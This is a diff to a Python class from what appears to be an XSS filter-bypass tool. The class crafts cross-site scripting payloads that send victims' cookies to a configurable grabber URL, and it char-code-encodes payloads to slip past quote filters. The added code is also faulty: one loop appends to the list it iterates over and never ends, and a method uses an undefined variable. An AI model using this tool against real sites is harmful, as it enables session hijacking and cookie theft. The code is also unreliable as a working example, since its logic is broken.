@@ -1,7 +1,8 @@
 import sys
-
+from XSSFilterBypass.Obfuscator import *
 
 class PayloadCrafter:
+
     def __init__(self, grabberAddress="http://localhost/cookie.php?c="):
         self.payloads = []
         self.restricted = []
@@ -37,14 +38,28 @@ class PayloadCrafter:
             sys.stderr.write("Error. restricted items must be passed as a string or a list.\n")
             raise TypeError
     
-    def craft(self, payload):
+    def replace_host(self, payload):
         return payload.replace(self.oldAddress, self.grabberAddress)
     
     def get_payloads(self):
         payloads = []
         for payload in self.payloads:
             if not any([i in payload for i in self.restricted]):
-                payloads.append(self.craft(payload))
+                payloads.append(self.replace_host(payload))
+            if "'" in self.restricted or '"' in self.restricted:
+                for payload in payloads:
+                    payloads.append(to_char_code(payload))
+        print(payloads)
         self.payloads = payloads
         return self.payloads
-    
+        
+    def char_code(self, payload):
+        payloads.append(to_char_code(payload))
+
+
+    def add_payload_to_list(self, payload):
+        with open('payloads.txt', 'a+') as f:
+            f.write(payload + '\n')
+
+
+
